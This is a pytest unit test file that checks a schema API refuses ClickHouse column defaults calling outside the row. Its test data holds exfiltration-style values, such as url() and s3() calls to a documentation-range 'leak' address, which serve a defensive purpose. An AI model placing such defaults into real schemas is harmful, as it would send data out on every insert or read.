#  Project:      dfe-engine
#  File:         tests/unit/test_api/test_schema_offbox_defaults.py
#  Purpose:      A schema column default that reads outside the row is refused
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""POST /api/v1/schemas/definitions refuses an off-box column default.

``schema:write`` is held by data_analyst, and a DEFAULT, MATERIALIZED or ALIAS
expression is evaluated by ClickHouse on every insert or read of the column, so
a call such as ``url()`` would fire on the data path rather than on one query.
The address below is in the documentation range (RFC 5737).
"""

import pytest

SCHEMA = "meta/beats/offbox"
URL = f"/api/v1/schemas/definitions/{SCHEMA}"

OFFBOX_DEFAULTS = {
    "url": "url('http://203.0.113.9/leak', 'LineAsString')",
    "s3": "s3('https://203.0.113.9/bucket/key', 'CSV')",
    "dictionary": "dictGetString('tenants', 'name', toUInt64(1))",
    "ai": "aiGenerate(toString(_json))",
}


def _body(default: str, attribute: list[str] | None = None) -> dict:
    column = {"name": "host_name", "type": "string", "_field_type": "base", "default": default}
    if attribute:
        column["attribute"] = attribute
    return {
        "current": "1.0.0",
        "versions": {
            "1.0.0": {
                "date": "2026-10-03",
                "type": "model",
                "summary": "offbox default",
                "columns": [
                    {"name": "timestamp", "type": "timestamp", "_field_type": "base"},
                    column,
                ],
            }
        },
    }


@pytest.mark.parametrize("default", OFFBOX_DEFAULTS.values(), ids=list(OFFBOX_DEFAULTS))
def test_a_column_default_that_reads_outside_the_row_is_refused(client, admin_headers, default):
    response = client.post(URL, headers=admin_headers, json=_body(default))

    assert response.status_code == 422, response.text
    body = response.json()
    assert body["code"] == "validation_error"
    assert "The default for column 'host_name' may not call" in body["message"]
    listed = client.get("/api/v1/schemas", headers=admin_headers, params={"per_page": -1})
    assert SCHEMA not in [row["name"] for row in listed.json()["items"]]


@pytest.mark.parametrize("attribute", [["materialized"], ["alias"]])
def test_the_materialized_and_alias_forms_are_refused_as_well(client, admin_headers, attribute):
    response = client.post(
        URL, headers=admin_headers, json=_body(OFFBOX_DEFAULTS["url"], attribute)
    )

    assert response.status_code == 422, response.text
    assert "may not call url()" in response.json()["message"]


def test_a_default_over_the_row_is_still_accepted(client, admin_headers):
    response = client.post(URL, headers=admin_headers, json=_body("now64(3)"))

    assert response.status_code == 201, response.text
